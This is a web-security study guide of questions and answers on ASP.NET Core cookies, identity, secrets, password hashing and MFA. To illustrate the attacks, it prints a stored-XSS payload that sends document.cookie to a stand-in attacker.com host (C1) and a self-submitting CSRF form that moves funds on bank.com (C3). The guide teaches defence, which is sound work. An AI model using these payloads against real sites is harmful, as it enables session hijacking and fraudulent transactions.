## SECTION C — SECURITY (Identity, Cookies, Secrets)

### EASY

**C1.** What does `HttpOnly` on a cookie prevent? What attack does it mitigate?

<details><summary>Answer</summary>

- **Prevents** JavaScript from accessing the cookie via `document.cookie`.
- **Mitigates** XSS-based session theft — even if an attacker injects script, they can't read the auth cookie.
- The cookie is still sent automatically by the browser with every HTTP request.
</details>

<details><summary>Deep Dive</summary>

**How the browser enforces HttpOnly**

The `HttpOnly` flag is communicated in the `Set-Cookie` response header:

```
Set-Cookie: sessionId=abc123; Path=/; HttpOnly; Secure; SameSite=Strict
```

The browser stores this cookie but excludes it from `document.cookie` in the JavaScript API. This is a browser-level enforcement — the JavaScript engine simply has no access path. Even `document.cookie = "sessionId=new"` can't overwrite an HttpOnly cookie (it's silently ignored).

Interestingly, you CAN see HttpOnly cookies in browser DevTools (Application → Cookies tab) — but that requires physical access to the machine. Code running on the page cannot.

**The XSS attack flow — with and without HttpOnly**

Without HttpOnly, a stored XSS payload like:
```html
<script>
  fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie))
</script>
```
exfiltrates the session cookie to the attacker's server. They use it to impersonate the victim.

With HttpOnly, `document.cookie` returns an empty string (or only non-HttpOnly cookies). The session cookie is invisible to the script. The attack fails.

**The important nuance: HttpOnly doesn't stop XSS — it limits what XSS can do**

An attacker with XSS execution can still:
- Make authenticated API calls on behalf of the user (same-origin, cookie auto-attached)
- Read sensitive DOM content (account numbers, emails displayed on page)
- Redirect the user to a phishing page
- Inject a keylogger for future credential theft

HttpOnly specifically prevents *cookie exfiltration*, not all XSS damage. This is why you still need a strong Content Security Policy (CSP) to restrict what scripts can run and where they can connect.

**HttpOnly in ASP.NET Core — how it's set**

```csharp
builder.Services.AddAuthentication(CookieAuthenticationDefaults.AuthenticationScheme)
    .AddCookie(options =>
    {
        options.Cookie.HttpOnly = true;  // default: true — never change this to false
        options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
        options.Cookie.SameSite = SameSiteMode.Strict;
    });
```

`HttpOnly = true` is the default for ASP.NET Identity cookies. You would only set it to `false` for non-sensitive cookies that JavaScript legitimately needs to read (e.g., a UI preference cookie).

**The server-side reads it, the browser sends it**

Even with HttpOnly, the browser still sends the cookie on every HTTP request to the matching domain/path — that's the whole point. The server reads `HttpContext.Request.Cookies["sessionId"]` normally. The restriction is purely on client-side JavaScript access.
</details>

---

**C2.** What is the difference between authentication and authorization?

<details><summary>Answer</summary>

- **Authentication** — WHO are you? (verifying identity — login, token, certificate).
- **Authorization** — WHAT can you do? (checking permissions — roles, policies, claims).
- Auth happens first — you must know WHO before deciding WHAT they can access.
- **401** = not authenticated. **403** = authenticated but not authorized.
</details>

<details><summary>Deep Dive</summary>

**Authentication — proving identity**

Authentication is the process of verifying that someone is who they claim to be. There are multiple factors:
- **Something you KNOW**: password, PIN, security question
- **Something you HAVE**: authenticator app (TOTP), SMS code, hardware token (YubiKey)
- **Something you ARE**: fingerprint, face scan, voice

Multi-Factor Authentication (MFA) requires at least two factors from different categories. Even if a password is stolen, the attacker can't authenticate without the second factor.

In ASP.NET Core, authentication produces a `ClaimsPrincipal` — a container for one or more `ClaimsIdentity` objects. Each `ClaimsIdentity` has:
- `AuthenticationType` (e.g., "Cookies", "Bearer")
- `IsAuthenticated` (true if the identity came from a real authentication)
- A list of `Claim` objects: `{ Type: "email", Value: "alex@example.com" }`, `{ Type: "role", Value: "Admin" }`

**Authorization — enforcing permissions**

Authorization answers "can this authenticated identity perform this action?" There are three common models:

1. **Role-based**: `[Authorize(Roles = "Admin,Manager")]` — user must have one of these roles as a claim. Simple, but inflexible — roles tend to proliferate.

2. **Claims-based**: check for specific claim values. `[Authorize(Policy = "IsVerified")]` where the policy checks for a `"verified": "true"` claim.

3. **Policy-based** (most powerful):
```csharp
builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("SeniorEmployee", policy => policy
        .RequireAuthenticatedUser()
        .RequireClaim("department", "Engineering")
        .RequireClaim("yearsOfService")
        .AddRequirements(new MinimumYearsRequirement(5)));
});
```
Policies can call external services, check database state, evaluate business rules.

**The 401 vs 403 distinction — why it matters**

- **401 Unauthorized** (misleading name — should be "Unauthenticated"): the request has no valid identity, or the credentials are wrong. The `WWW-Authenticate` header hints at how to authenticate. The browser can prompt for login.
- **403 Forbidden**: the identity IS verified, but they don't have permission. No amount of credential re-entry will help — the server understands who you are and is saying "no."

In ASP.NET Core:
- `ChallengeAsync()` → 401 (redirect to login page for cookies, `WWW-Authenticate` header for JWT)
- `ForbidAsync()` → 403 (you're logged in but not allowed)

**A practical example in context**

```
User: "I want to delete order #123"

Authentication asks: "Do you have a valid session?"
  → No session cookie → 401 → redirect to /login

Authentication asks: "Do you have a valid session?"
  → Valid cookie, user is Alice (customer role) → authenticated

Authorization asks: "Can a 'customer' delete orders?"
  → Policy says only 'Admin' can delete orders → 403 → show "Access Denied"

Authorization asks: "Can a 'customer' delete orders?"
  → User is Bob (admin role) → 200 → order deleted
```
</details>

---

**C3.** What does `SameSite=Strict` protect against?

<details><summary>Answer</summary>

- **Prevents** the browser from sending the cookie on any cross-site request (links, forms, images).
- **Protects against CSRF** — an attacker's page can't trigger authenticated actions because the cookie is never sent.
- **Downside** — users clicking links from external sites (email, social media) arrive unauthenticated.
</details>

<details><summary>Deep Dive</summary>

**What is a "site" vs an "origin"?**

This distinction matters for understanding SameSite:
- **Origin**: scheme + host + port. `https://app.example.com:443` and `https://api.example.com:443` are **different origins** (different subdomains) but the **same site** (eTLD+1 = `example.com`).
- **Site**: eTLD+1 (effective Top-Level Domain + 1 label). `github.com` and `api.github.com` are **same-site**. `github.com` and `gitlab.com` are **cross-site**.

SameSite=Strict blocks cross-site cookies (different eTLD+1), not just cross-origin. So a request from `api.example.com` to `app.example.com` still sends the cookie (same site).

**The CSRF attack in detail**

CSRF (Cross-Site Request Forgery) exploits the browser's automatic cookie attachment behavior. Without SameSite protection:

1. Alice is logged into `bank.com` (browser holds session cookie).
2. Alice visits `evil.com` (in another tab or from an email link).
3. `evil.com` contains: `<form action="https://bank.com/transfer" method="POST"><input name="amount" value="1000"><input name="to" value="attacker"></form><script>document.forms[0].submit()</script>`
4. Browser submits the form to `bank.com` and automatically includes the `bank.com` session cookie.
5. `bank.com` sees a valid authenticated request from Alice → transfer completes.

With `SameSite=Strict`, step 4 sends the form POST but the browser **omits** the session cookie (it's a cross-site request). `bank.com` sees an unauthenticated request → rejected.

**Why the Strict UX problem is real**

Consider this common flow:
1. A customer service email contains: "Click here to view your order status: https://myshop.com/orders/123"
2. User clicks the link from Gmail.
3. Gmail (mail.google.com) → myshop.com is a **cross-site** top-level navigation.
4. With `SameSite=Strict`: cookie NOT sent → user appears as unauthenticated → redirected to login page.
5. User logs in → redirected back to the order. Terrible UX for a perfectly legitimate flow.

With `SameSite=Lax`: top-level GET navigations DO send the cookie → user lands on the order page already authenticated. This is why Lax is the browser default and the practical choice.

**How SameSite interacts with HTTPS and Secure**

`SameSite=None` requires the `Secure` flag. Without it, Chrome ignores `SameSite=None` and treats it as `Lax`. This is a browser security requirement since Chrome 80 (2020).

In ASP.NET Core, setting `SameSite=None` without `Secure` is silently rejected by most modern browsers — your cross-site cookie simply won't be sent.

**Defense in depth: SameSite + CSRF tokens**

SameSite alone is not sufficient if you need to support older browsers or if your mutation endpoints accept GET (bad practice, but it happens). The full defense stack is:
1. `SameSite=Strict` or `Lax`
2. Anti-forgery tokens (`[ValidateAntiForgeryToken]` in MVC, or custom headers for APIs)
3. Check `Origin`/`Referer` headers on the server side

For APIs (JSON, no forms), the `Content-Type: application/json` requirement combined with SameSite is usually sufficient — CSRF exploits can't set arbitrary content types via forms.
</details>

---

### MEDIUM

**C4.** Explain the three `SameSite` cookie values: `Strict`, `Lax`, and `None`. For each, describe when the browser sends the cookie and what attack it prevents or allows.

<details><summary>Answer</summary>

`Strict`: cookie never sent on cross-site requests — maximum CSRF protection but poor UX (links from email = unauthenticated).

`Lax` (browser default): sent on top-level GET navigations (clicking a link) but NOT on POST, iframe, AJAX, or images from other sites — good balance.

`None`: sent on ALL cross-site requests — requires `Secure` flag — needed for cross-origin iframes, OAuth flows. Use Lax for most apps.
</details>

---

**C5.** A user reports: "I log in successfully, but every API call after that returns 401." The login endpoint returns 200. What are the top 5 things you check?

<details><summary>Answer</summary>

1. Cookie not being sent: check Domain, Path, SameSite, Secure flags — browser may silently drop it.
2. CORS: `withCredentials: true` on client AND `AllowCredentials()` on server (can't use wildcard origin).
3. Middleware order: `UseAuthentication` before `UseAuthorization`.
4. Token expired or clock skew.
5. Scheme mismatch: authenticating with cookies but API expects Bearer, or wrong `DefaultAuthenticateScheme`.
</details>

<details><summary>Deep Dive</summary>

**Cookie flags that silently prevent sending**

- **Domain**: if set to `.example.com` but the request is from `api.example.com`, some browsers don't send it.
- **Path**: if set to `/auth` but the request is to `/api/orders`, the cookie isn't sent.
- **SameSite=Strict**: cross-site requests don't send the cookie (email links, external references).
- **Secure**: only sent over HTTPS. If development is HTTP and cookie is Secure, it's never sent.

In browser DevTools, you can see the cookie in the Application tab, but it shows which request patterns would send it (via comment or indicator).

**CORS credential flow**

The JavaScript fetch must include:
```javascript
fetch('/api/orders', { credentials: 'include' })  // withCredentials: true in Angular
```

The server response must include:
```
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://app.example.com  // specific origin, not wildcard
```

If either is missing, the browser blocks the credential from being sent, and the request arrives unauthenticated.

**Clock skew — JWT expiration times**

JWT includes `exp` (expiration) claim. If the server clock is faster than the client's clock, a token expires from the server's perspective but is still valid to the client. The server rejects it. Sync system clocks or add 30 seconds to the validation leeway:

```csharp
.AddJwtBearer(options =>
{
    options.TokenValidationParameters.ClockSkew = TimeSpan.FromSeconds(30);
});
```

**Scheme mismatch — the insidious one**

If the server is configured for Bearer tokens but the client sends cookies (or vice versa), the request is unauthenticated. Check the `DefaultAuthenticateScheme`:

```csharp
services.AddAuthentication(CookieAuthenticationDefaults.AuthenticationScheme)
    .AddCookie()
    .AddJwtBearer();
    
// DefaultAuthenticateScheme is cookies. If client sends JWT Bearer header, it's ignored.
// JWT is available for explicit [Authorize(AuthenticationSchemes = "Bearer")] only.
```
</details>

---

**C6.** What is `SecurityStamp` in ASP.NET Identity? When is it updated? How does the cookie middleware use it? What happens if you set `SecurityStampValidatorOptions.ValidationInterval = TimeSpan.Zero`?

<details><summary>Answer</summary>

- **`SecurityStamp`** — a GUID that changes whenever security-sensitive data changes (password, roles, 2FA, email).
- Cookie middleware validates the stamp against the DB periodically (default every 30 min). Mismatch = sign out.
- **`TimeSpan.Zero`** — validates on every request: immediate invalidation, but a DB hit per request (performance cost).
</details>

<details><summary>Deep Dive</summary>

**SecurityStamp — the validation token inside the cookie**

When a user logs in, the cookie contains encrypted data including the `SecurityStamp` (a GUID). The `SecurityStampValidator` middleware checks this periodically. On each check, it reads the stamp from the DB and compares. If they don't match, the user is signed out (old cookie is invalidated).

If a user changes their password → stamp is regenerated → old cookies are invalidated → all other devices are logged out. This is the "sign out all sessions" behavior.

**Performance tradeoff with validation interval**

Checking on every request → immediate invalidation on password change but kills performance (DB hit per request). Default 30 minutes is a balance: password changes take up to 30 minutes to propagate, but DB load is minimal.

For high-security apps (banking), reduce to 1 minute. For public apps, 30–60 minutes is fine.
</details>

---

**C7.** What is `DefaultAzureCredential`? In Azure App Service, which auth method fires? Locally? What's the fixed order it tries?

<details><summary>Answer</summary>

`DefaultAzureCredential` is a chained credential that tries auth methods in order:
1. EnvironmentCredential
2. WorkloadIdentityCredential
3. ManagedIdentityCredential
4. AzureCLICredential
5. VisualStudioCredential
6. AzurePowerShellCredential

In Azure App Service: Managed Identity fires. Locally: Azure CLI (`az login`) or Visual Studio. This lets the same code work in dev and prod without changes.
</details>

<details><summary>Deep Dive</summary>

**Order matters — the chain stops at first success**

The credential tries each method in order and returns the first successful auth. `EnvironmentCredential` checks for `AZURE_CLIENT_ID`, `AZURE_CLIENT_SECRET`, `AZURE_TENANT_ID` env vars. If found, it authenticates with a service principal (useful in CI/CD). If not found, it tries the next method.

In App Service with Managed Identity enabled, the VM's Managed Identity becomes available at `http://169.254.169.254/metadata/identity/oauth2/token`. The credential checks this endpoint and uses it if available.

Locally, after running `az login`, credentials are cached in `~/.azure/accessTokens.json`. The chain finds them and uses them.

**Why the chain design is powerful**

The same code works in dev (uses CLI), CI/CD (uses service principal env vars), and prod (uses Managed Identity) — no code change. This is why `DefaultAzureCredential` is the recommended pattern.
</details>

---

**C8.** Why does `SlidingExpiration = false` matter for security? What's the risk if sliding expiration is enabled and an attacker steals the cookie?

<details><summary>Answer</summary>

- **Sliding = true** — resets the cookie lifetime on every request. An attacker who steals the cookie can keep it alive indefinitely by making periodic requests.
- **Sliding = false** — the cookie has a fixed absolute expiry regardless of activity, limiting the stolen cookie's window of use.

Best practice: `SlidingExpiration = false` with `ExpireTimeSpan = TimeSpan.FromHours(24)`.
</details>

<details><summary>Deep Dive</summary>

**Absolute vs sliding expiration**

With `SlidingExpiration = true`: every request refreshes the expiration time. A user who logs in and is active for 24 hours has their session live 24 hours + idle timeout (e.g., 20 minutes). But if an attacker steals the cookie and makes requests every 5 minutes, the session never expires.

With `SlidingExpiration = false`: the cookie has an absolute expiration time (e.g., 24 hours from login). No matter how active the session is, it expires at that time. If stolen, the attacker has at most 24 hours of access.

Best practice: use `SlidingExpiration = false` with `ExpireTimeSpan = TimeSpan.FromHours(24)` for security.
</details>

---

**C9.** A new developer clones the repo and runs `dotnet run`. They get `StripeSettings:SecretKey is not configured`. What do they do? Why can't they put it in `appsettings.json`?

<details><summary>Answer</summary>

- Run `dotnet user-secrets set "StripeSettings:SecretKey" "sk_test_..."`.
- User Secrets stores values in a per-user JSON file **outside the repo** (`%APPDATA%/Microsoft/UserSecrets/`).
- **Can't use `appsettings.json`** — it's committed to git; secrets in git history are permanent and public.
- **Production** — use environment variables or Azure Key Vault with Managed Identity.
</details>

---

### HARD

**C10.** A penetration tester finds that your `SameSite=Strict` cookie is not sent when a user clicks a link from Gmail to your site. The user lands unauthenticated. The product team says this is unacceptable UX. How do you fix it? What security do you lose? How do you compensate?

<details><summary>Answer</summary>

Switch to `SameSite=Lax` — it sends the cookie on top-level GET navigations (link clicks) but blocks cross-site POST/AJAX.

You lose: protection against cross-site GET-based actions (but GETs should be idempotent anyway).

Compensate: ensure state-changing operations use POST + anti-forgery token.

Advanced: two-cookie pattern — Lax cookie for reading, Strict cookie required for mutations.
</details>

<details><summary>Deep Dive</summary>

**The UX vs security tradeoff**

`SameSite=Strict` blocks all cross-site requests, so clicking a link from Gmail → your site → you arrive unauthenticated (terrible UX). `SameSite=Lax` allows GET navigations (link clicks) but blocks POST/AJAX — a middle ground.

The assumption: GET requests are idempotent (no side effects). A link click should only READ, not MODIFY. If your app violates this (GET endpoints that write), you've already lost.

**Two-cookie pattern for sensitive operations**

```csharp
// Session cookie — Lax (readable via links)
services.AddAuthentication()
    .AddCookie("session", opt =>
    {
        opt.Cookie.SameSite = SameSiteMode.Lax;
    });

// Mutation cookie — Strict (only same-site requests)
services.AddCookie("mutation", opt =>
{
    opt.Cookie.SameSite = SameSiteMode.Strict;
});
```

On sensitive endpoints (delete, transfer), check the Strict cookie:
```csharp
[HttpPost("delete-account")]
[Authorize(AuthenticationSchemes = "mutation")]
public IActionResult DeleteAccount()
{
    // Only reachable with Strict cookie
}
```

Lax requests can read data, but mutations require the Strict cookie — CSRF attacks fail.
</details>

---

**C11.** Your cookie has `SameSite=Strict`, `HttpOnly`, and `Secure`. A colleague claims the app is immune to session hijacking. List every remaining attack vector and mitigation for each.

<details><summary>Answer</summary>

Still vulnerable to:
1. **XSS** — can't read cookie but CAN make same-origin requests as the user. Mitigation: CSP, input sanitization.
2. **Session fixation** — attacker pre-sets session ID. Mitigation: regenerate session on login.
3. **Physical/malware access** to the device. Mitigation: short absolute expiry, 2FA.
4. **TLS misconfiguration** (mixed content). Mitigation: HSTS, HTTPS everywhere.
5. **Subdomain takeover** — cookie scoped to `.example.com` accessible from compromised subdomain. Mitigation: scope cookie to exact domain.
6. **Browser extensions** with elevated permissions. Mitigation: nothing practical.

Not immune — defense-in-depth is essential.
</details>

---

**C12.** Explain how ASP.NET Identity's password hashing works under the hood. What algorithm does it use? What is key stretching? What is a salt? Why is `bcrypt`/`PBKDF2` better than `SHA256(password + salt)` for passwords? How many iterations does Identity use by default?

<details><summary>Answer</summary>

- **Algorithm** — PBKDF2 with HMAC-SHA512 (v3 format).
- **Salt** — random 128-bit per user; prevents rainbow tables (same password hashes differently for each user).
- **Key stretching** — runs the hash N times (100K+ iterations, 600K in .NET 8); intentionally slow to defeat brute force.
- **Why not SHA256?** — too fast; GPUs can try billions of hashes/sec.
- **Bcrypt/Argon2** — even stronger (memory-hard), harder to attack with GPU farms.
</details>

<details><summary>Deep Dive</summary>

**Rainbow tables — precomputed hash dictionaries**

If you hash passwords with just SHA256, an attacker can precompute hashes of common passwords (dictionary, common phrases) and compare against a stolen hash database. A salt (random 128-bit per user) makes precomputation useless — each password has a unique salt, so the same password hashes to different values. Precomputing all combinations is infeasible (2^128 possibilities per password).

**Key stretching — intentional slowness**

PBKDF2 runs the hash function many times (default: 100,000 iterations in ASP.NET Core Identity). Each login attempt takes 100K hash operations. A brute force attack trying 1M passwords would require 100 billion hash operations — impractical.

Bcrypt and Argon2 are even better: they're memory-hard (require large amounts of RAM) and CPU-hard, making GPU/ASIC attacks even more expensive.

**Iteration count increases over time**

As computers get faster, the iteration count should increase. You can configure it via `PasswordHasherOptions.IterationCount`. When you increase the count, existing hashes remain valid (verified against the old count). The `PasswordHasher` returns `PasswordVerificationResult.SuccessRehashNeeded` when a hash was produced with an outdated count — your application code must then re-hash and persist the new hash on the next successful login.

**Never expose password hashes**

Even with stretching, if an attacker gets the hashes, they can attack offline at their own pace. Always:
- Hash passwords immediately on input
- Never log/store plaintext
- Use HTTPS to prevent interception
- Use 2FA to mitigate weak passwords
</details>

---

**C13.** A user reports: "I changed my password but I'm still logged in on my phone from yesterday." Why? How do you fix it? What's the tradeoff?

<details><summary>Answer</summary>

- **Cause** — the cookie middleware validates the `SecurityStamp` only every 30 min by default. The password change updates the stamp, but the phone's cookie isn't re-validated until the next interval.
- **Fix** — reduce `SecurityStampValidatorOptions.ValidationInterval` (e.g. to 1 minute).
- **Tradeoff** — shorter interval = more DB hits per request; `TimeSpan.Zero` = every request (expensive at scale).
- **Better** — cache the stamp in Redis with a 1-minute TTL to get fast invalidation without per-request DB calls.
</details>

<details><summary>Deep Dive</summary>

**SecurityStamp validation flow**

On each request, the cookie middleware checks if `ValidationInterval` has passed. If so, it reads the stamp from the DB and compares. If the client's stamp is stale, the user is logged out.

Default 30 minutes: high performance, slow invalidation (up to 30 min delay after password change). Zero: immediate invalidation, DB hit per request (expensive at scale).

**Distributed cache solution**

Cache the current stamp in Redis with a 1-minute TTL:

```csharp
public class SecurityStampValidator
{
    private readonly IDistributedCache _cache;
    
    public async Task ValidateAsync(string userId, string cachedStamp)
    {
        var cacheKey = $"stamp:{userId}";
        var dbStamp = await _cache.GetStringAsync(cacheKey);
        
        if (dbStamp == null)
        {
            dbStamp = await _userManager.GetSecurityStampAsync(user);
            await _cache.SetStringAsync(cacheKey, dbStamp, absoluteExpirationRelativeToNow: TimeSpan.FromMinutes(1));
        }
        
        if (cachedStamp != dbStamp) throw new InvalidOperationException("Stamp mismatch");
    }
}
```

Combines the best of both: immediate invalidation (1-min cache expiry) with reduced DB hits.
</details>

---

**C14.** Compare three approaches to storing session state: (1) encrypted cookie, (2) server-side session with Redis, (3) JWT in localStorage. For each: where is state stored, size limit, how do you revoke, XSS/CSRF attack surface?

<details><summary>Answer</summary>

| | Encrypted cookie | Redis session | JWT in localStorage |
|---|---|---|---|
| State stored | In the cookie (~4KB) | Server (Redis), small session ID cookie | Client (localStorage) |
| Revocation | SecurityStamp / key rotation | Delete Redis key — instant | Blacklist required (defeats stateless) |
| XSS surface | Safe — HttpOnly blocks JS | Safe — HttpOnly session cookie | Vulnerable — JS can read localStorage |
| CSRF surface | Mitigated by SameSite | Mitigated by SameSite | Immune — not auto-sent by browser |

Cookies + Redis is the most secure combo.
</details>

<details><summary>Deep Dive</summary>

**Encrypted cookie approach**

The cookie contains encrypted user data (ID, roles, claims). No server state needed — stateless. Problem: to revoke, you'd need to rotate the encryption key (affects all users).

**Redis session approach**

The cookie contains a session ID. The server stores session data in Redis. To logout, delete the Redis key — instant revocation. Extra DB roundtrip per request (negligible with Redis).

**JWT in localStorage — the problematic pattern**

JWTs are stateless (encoded data, no server lookup). If stolen via XSS, you must blacklist the JWT. But blacklist checking requires a server state (Redis/DB), defeating the "stateless" benefit. Also, localStorage is accessible to JavaScript, making XSS attacks more powerful.

**The CSRF column**

Cookies are auto-sent by the browser on same-origin requests — vulnerable to CSRF. JWTs in localStorage are NOT auto-sent (you must manually attach via `Authorization` header) — immune to CSRF.

But you can mitigate CSRF with anti-forgery tokens or `SameSite`.

**Recommendation**

For most web apps: encrypted cookie in HttpOnly, SameSite, Secure. For stateless APIs (mobile, third-party): JWT in Authorization header (acceptable XSS risk if you have strong CSP).
</details>

---

**C15.** You need to add MFA to your current cookie-based Identity setup. What changes in the backend, frontend, and user flow? What does `PasswordSignInAsync` return when MFA is required?

<details><summary>Answer</summary>

`PasswordSignInAsync` returns `SignInResult.TwoFactorRequired` — NOT a successful sign-in.

**Backend:** generate TOTP key (`GenerateNewAuthenticatorKey`), store it, verify codes with `VerifyTwoFactorTokenAsync`. Call `TwoFactorAuthenticatorSignInAsync` to issue the cookie after verification.

**Frontend:** detect `RequiresTwoFactor` in the response, redirect to 2FA page, collect code, POST to verify endpoint.

**User flow:** email+password → 2FA prompt → 6-digit code → authenticated session.

Also generate recovery codes as fallback. Store the 2FA key encrypted.
</details>

<details><summary>Deep Dive</summary>

**TOTP (Time-based One-Time Password) — how it works**

The authenticator app (Google Authenticator, Authy) has the TOTP secret (a random 32-byte key). It combines the secret with the current time (in 30-second intervals) and runs HMAC-SHA1:

```
TOTP = HMAC-SHA1(secret, time) mod 1,000,000
```

Every 30 seconds, a new 6-digit code is generated. The server does the same calculation (using the server's time) and compares the codes.

**Time skew tolerance**

Server and client clocks are rarely perfectly synced. Microsoft and Google accept ±1 time window (60 seconds):

```csharp
var isValid = _userManager.VerifyTwoFactorTokenAsync(user, "Authenticator", code).Result;
// Internally checks current and ±1 window
```

This allows for ~60 seconds of clock drift.

**Recovery codes — the backup**

Users lose their phone or uninstall the app. Recovery codes (one-time use, printed on setup) let them regain access:

```csharp
await _userManager.GenerateNewTwoFactorRecoveryCodesAsync(user, count: 10);
```

Store these encrypted in the database. When the user uses one, mark it as consumed. After K uses, force new codes.

**2FA for sensitive operations only**

You don't need to enforce 2FA for every login in most apps. Enforce on:
- Account creation
- Login from new location
- Password change
- Privilege escalation (become admin)

For routine logins from known devices, optional 2FA is acceptable.
</details>

---

